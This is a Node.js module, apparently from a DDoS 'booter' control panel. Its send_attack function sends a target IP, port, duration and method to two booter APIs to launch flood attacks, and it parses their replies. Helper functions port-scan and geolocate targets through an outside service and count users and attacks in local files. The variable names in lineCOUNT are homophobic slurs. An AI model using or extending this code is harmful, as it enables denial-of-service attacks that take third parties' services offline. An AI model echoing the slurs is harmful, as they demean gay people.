const fs = require("fs");
const config = require("../config/strings.js");
const func = require("./functions.js");
const fetch = require("node-fetch");
var term = require( 'terminal-kit' ).terminal;
const { Socket } = require("dgram");

exports.GeoIP = async function(ip) {
    let results = await(await fetch("https://scrapy.tech/tools/?action=geoip&q="+ ip)).text();
    return results;
}

exports.pScan = async function(ip) {
    let get_result = await(await fetch("https://scrapy.tech/tools/?action=portscan&q=" + ip)).text();
    return get_result;
}

exports.stats = function(option) {
    if(option === null || option === "undefined") {
        return "Invalid argument";
    } else {
        switch(option) {
            case "users":
                return func.lineCOUNT("./db/users.db")-1;
            case "current":
                return func.lineCOUNT("./db/current.db")-1;
            case "attacks":
                return func.lineCOUNT("./db/attacks.db")-1;
            case "logs":
                return func.lineCOUNT("./db/logs.db")-1;
        }
    }
}

exports.lineCOUNT = function(file_path) {
    let fag = fs.readFileSync(file_path, "utf8");
    let hover_is_gay = fag.split("\n").length;
    return hover_is_gay;
}

exports.log = function() {

}

exports.log_to_file = function(str) {
    fs.appendFileSync("./db/logs.db", str);
}

exports.log_attacks = function(ip, port, time, method) {

}

exports.send_attack = async function(ip, port, time, method) {
    let response = "";
    let rreturn = await(await fetch(config.BOOTERAPI + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
    response += "API 1: " + await func.get_api_response(rreturn) + "\r\n";
    let rreturn1 = await(await fetch(config.BOOTERAPI2 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
    response += "API 2: " + await func.get_api_response(rreturn1) + "\r\n";
    return response;
}

exports.get_api_response = function(rpn) {
    rpn = rpn.toLowerCase();
    if(rpn.includes("attack sent") || rpn.includes("!* udp") || rpn.includes("!* tcp")) {
        return "Attack Sent";
    } else if(rpn.includes("invalid key") || rpn.includes("key is invalid")) {
        return "Error, Invalid Key";
    } else if(rpn.includes("invalid method") || rpn.includes("method is invalid") || rpn.includes("method does not exist") || rpn.includes("method doesn't exist")) {
        return "Error, Invalid Method";
    } else if(rpn.includes("error when connecting to the server if the problem")) { //CUSTOM (REMOVE LATER)
        return "Error, Either all fields aren't set or invalid method!";
    } else {
        return "Error, Something went wrong catching attack response!";
    }
}